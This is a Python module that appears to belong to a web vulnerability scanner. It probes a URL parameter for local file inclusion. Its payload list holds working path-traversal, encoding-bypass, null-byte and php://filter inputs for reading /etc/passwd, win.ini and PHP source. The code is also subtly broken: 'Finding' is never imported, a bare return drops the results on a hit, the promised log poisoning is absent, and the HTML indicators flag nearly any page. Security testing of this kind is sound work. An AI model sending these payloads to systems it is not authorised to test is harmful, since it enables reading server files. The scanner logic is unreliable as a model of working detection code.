"""Local File Inclusion (LFI) Scanner"""
import logging
from scanners.base_scanner import BaseScanner

log = logging.getLogger("xone.scanners.lfi")


class LFIScanner(BaseScanner):
    """LFI vulnerability scanner"""

    @property
    def name(self) -> str:
        return "lfi_scanner"

    @property
    def description(self) -> str:
        return "LFI: path traversal, encoding bypass, log poisoning"

    PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..//..//..//..//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..;/..;/..;/etc/passwd",
        "php://filter/convert.base64-encode/resource=../index.php",
        "/etc/passwd%00",
        "/etc/passwd\0",
    ]

    async def scan(self, url: str, param: str) -> list[Finding]:
        """Scan for LFI vulnerabilities"""
        self.findings = []

        log.info(f"[LFI] Scanning: {url}?{param}=FILE")

        # Test each payload
        for payload in self.PAYLOADS:
            try:
                test_url = f"{url}?{param}={payload.replace(' ', '%20')}"
                response = await self.client.get(test_url, allow_redirects=True)

                # Check for successful file read indicators
                if self._check_response(response.text):
                    self.create_finding(
                        vuln_type="Local File Inclusion (LFI)",
                        url=url,
                        payload=payload,
                        severity="High",
                        param=param,
                        context="Server returned file contents for path traversal payload",
                        cvss_score=7.5,
                        cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                    )
                    log.info(f"[LFI] Found with payload: {payload}")
                    return

            except Exception as e:
                log.debug(f"[LFI] Payload test error: {e}")

        return self.findings

    def _check_response(self, response_text: str) -> bool:
        """Check if response indicates successful file read"""
        indicators = [
            "root:",  # /etc/passwd
            "root:x:0:0",  # /etc/passwd on Linux
            "[drives]",  # win.ini
            "C:\\",  # Windows paths
            "<?php",  # PHP code
            "<!DOCTYPE",  # HTML files
            "<html",  # HTML tags
        ]

        return any(indicator in response_text for indicator in indicators)
